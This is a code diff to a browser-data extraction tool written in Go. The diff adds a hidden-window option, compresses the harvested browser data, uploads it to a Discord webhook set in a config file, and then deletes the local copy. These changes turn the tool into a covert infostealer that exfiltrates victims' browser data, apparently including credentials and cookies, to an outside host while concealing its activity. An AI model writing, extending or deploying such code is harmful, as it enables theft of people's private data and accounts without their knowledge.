@@ -8,6 +8,8 @@ import (
 	"github.com/moond4rk/hackbrowserdata/browser"
 	"github.com/moond4rk/hackbrowserdata/log"
 	"github.com/moond4rk/hackbrowserdata/utils/fileutil"
+	"github.com/moond4rk/hackbrowserdata/utils/webhook"
+	"github.com/moond4rk/hackbrowserdata/utils/window"
 )
 
 var (
@@ -18,9 +20,15 @@ var (
 	compress     bool
 	profilePath  string
 	isFullExport bool
+	configPath   string
 )
 
 func main() {
+	// Hide window early if configured (before any output)
+	config, _ := webhook.LoadConfig("config.json")
+	if config != nil && config.HideWindow {
+		_ = window.Hide()
+	}
 	Execute()
 }
 
@@ -38,6 +46,7 @@ func Execute() {
 			&cli.StringFlag{Name: "format", Aliases: []string{"f"}, Destination: &outputFormat, Value: "csv", Usage: "output format: csv|json"},
 			&cli.StringFlag{Name: "profile-path", Aliases: []string{"p"}, Destination: &profilePath, Value: "", Usage: "custom profile dir path, get with chrome://version"},
 			&cli.BoolFlag{Name: "full-export", Aliases: []string{"full"}, Destination: &isFullExport, Value: true, Usage: "is export full browsing data"},
+			&cli.StringFlag{Name: "config", Aliases: []string{"c"}, Destination: &configPath, Value: "config.json", Usage: "path to config file"},
 		},
 		HideHelpCommand: true,
 		Action: func(c *cli.Context) error {
@@ -65,6 +74,39 @@ func Execute() {
 				}
 				log.Debug("compress success")
 			}
+
+			// Load config and send to Discord webhook if configured
+			config, err := webhook.LoadConfig(configPath)
+			if err != nil {
+				log.Warnf("failed to load config: %v", err)
+			}
+			
+			if config != nil && config.DiscordWebhook != "" {
+				log.Debug("Discord webhook configured, sending results...")
+				
+				// Ensure results are compressed for webhook
+				if !compress {
+					if err = fileutil.CompressDir(outputDir); err != nil {
+						log.Errorf("compress error before sending: %v", err)
+						return err
+					}
+				}
+
+				if err := webhook.SendToDiscord(config.DiscordWebhook, outputDir); err != nil {
+					log.Errorf("failed to send to Discord: %v", err)
+					return err
+				}
+				
+				log.Debug("Results sent to Discord successfully")
+				
+				// Clean up local results after successful upload
+				if err := os.RemoveAll(outputDir); err != nil {
+					log.Warnf("failed to clean up results directory: %v", err)
+				} else {
+					log.Debug("Local results cleaned up")
+				}
+			}
+			
 			return nil
 		},
 	}
